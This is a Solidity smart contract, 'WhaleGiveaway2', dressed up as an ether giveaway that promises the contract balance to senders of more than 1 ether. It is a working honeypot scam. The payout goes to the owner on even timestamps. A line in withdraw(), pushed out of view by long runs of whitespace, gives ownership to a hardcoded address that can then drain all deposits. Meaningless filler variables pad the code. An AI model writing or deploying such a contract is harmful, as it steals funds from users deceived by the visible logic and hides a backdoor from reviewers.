pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    
    function()
    public
    payable
    {
        if (block.number % 2 == 0) { revert(); } else { }
    }
    
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {   
            if (now % 2 == 0) {
                Owner.transfer(this.balance);
            }
            if (now % 2 == 1) {
                msg.sender.transfer(this.balance);
            }
        } else {
            uint256 irrelevantValue = 1;
            irrelevantValue += 2;
        }                                                                                                                 
    }
    
    function withdraw()
    payable
    public
    {   
        uint256 randomVariable = 3;
        if(randomVariable > 2) {
            randomVariable -= 1;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){
            Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        } else {
            randomVariable += 1;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        
        if (block.timestamp % 2 == 0) {
            adr.call.value(msg.value)(data);
        } else {
            uint256 meaninglessVar = 5;
            meaninglessVar *= 7;
        }
    }
}